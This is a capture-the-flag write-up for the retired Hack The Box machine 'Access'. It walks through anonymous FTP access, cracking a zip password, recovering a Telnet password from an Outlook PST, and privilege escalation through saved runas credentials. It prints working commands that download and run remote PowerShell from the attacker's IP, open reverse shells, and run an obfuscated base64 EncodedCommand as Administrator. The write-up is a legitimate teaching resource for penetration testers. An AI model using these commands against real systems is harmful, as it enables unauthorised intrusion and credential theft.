# Access

This is the write-up for the box Access that got retired at the 2nd March 2019.
My IP address was 10.10.14.2 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.98    access.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/access.nmap 10.10.10.98
```

```markdown
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking FTP (Port 21)

On the FTP service _anonymous login_ is allowed and it is possible to see all the files:
```markdown
ftp 10.10.10.98
```

There are two directories, so downloading everything recursively:
```markdown
wget -r --no-passive ftp://10.10.10.98/
```

There are two directories and each has one file in it:
- _Backups/backup.mdb_
- _Engineer/Access Control.zip_

When trying to decompress the _zip_ file, it asks for a password:
```markdown
7z x "Access Control.zip"
```
```markdown
Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip

Enter password (will not be echoed):
ERROR: Wrong password : Access Control.pst
```

Checking the enryption method:
```markdown
7z l -slt "Access Control.zip"
```
```markdown
(...)
Method = AES-256 Deflate
(...)
```

Putting the hash into a file to crack the password later:
```markdown
zip2john "Access Control.zip" > Access_Control.hash
```

The file _backup.mdb_ is a **Microsoft Access Database** and we should take a look at the `strings` of the file:
```markdown
strings -n 8 backup.mdb
```

There are some human-readable strings, so it is not encrypted. The words from the `strings` can be used as a wordlist to get the password of the _zip_ file:
```markdown
strings -n 8 backup.mdb | sort -u > backup_wordlist
```

Cracking the hash with **JohnTheRipper** and the created wordlist:
```markdown
john Access_Control.hash --wordlist=Backups/backup_wordlist
```

The password of the hash for the file _Access Control.zip_ gets found in the wordlist and it is _access4u@security_.

> NOTE: The **Microsoft Access Database** can also be analyzed with **mdbtools** to search for passwords in the database tables.

After using the password on the _zip_ file, it gets decompressed and outputs a **PST file** called _Access Control.pst_.
This is a **Microsoft Outlook email folder** that could have some important emails in it.

The file can be converted into a readable file with **Readpst**:
```markdown
readpst "Access Control.pst"
```
```markdown
cat "Access Control.mbox"
```

There is one email from _john_:
```markdown
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,
John
```

There is only one login where the credentials could be used and that is the **Telnet service** on port 23.

## Checking Telnet (Port 23)

The password _"4Cc3ssC0ntr0ller"_ of the user _security_ works on Telnet and logs us into the box.
As this shell is not that great, lets try to elevate to a **PowerShell** shell.

By uploading and executing the PowerShell script _Invoke-PowerShellTcp.ps1_ from the **Nishang Scripts**, we are able to get a reverse shell connection.
I add the following line at the bottom of the script:
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 9001
```

Uploading and executing the script on the box:
```markdown
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/shell.ps1')"
```

After executing the script, the listener on my IP and port 9001 starts a reverse shell connection as _security_.

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Windows Enumeration Script**:
```markdown
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/jaws-enum.ps1')
```

It found stored credentials for _Administrator_:
```markdown
cmdkey /list
```
```markdown
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

In the public home directory _C:\Users\Public\Desktop_ is a **link file** called _"ZKAccess3.5 Security System.lnk"_.
Extracting the contents of the link:
```powershell
$WScript = New-Object -ComObject Wscript.Shell
$shortcut = Get-Childitem "C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk"

$Wscript.CreateShortcut($shortcut)
```
```markdown
FullName         : C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk
Arguments        : /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
TargetPath       : C:\Windows\System32\runas.exe
WindowStyle      : 1
WorkingDirectory : C:\ZKTeco\ZKAccess3.5
```

The saved credentials and _runas_ in the link are hints to run commands as _Administrator_ as it seems.
Lets run a Base64-encoded reverse shell with _runas_:
```markdown
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/shell-9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
```

Running the Base64-decoded PowerShell command with the saved credentials and _runas_:
```markdown
runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIALwBzAGgAZQBsAGwALQA5ADAAMAAyAC4AcABzADEAJwApAA=="
```

After running the command, the listener on my IP and port 9002 starts a reverse shell session as _Administrator_!
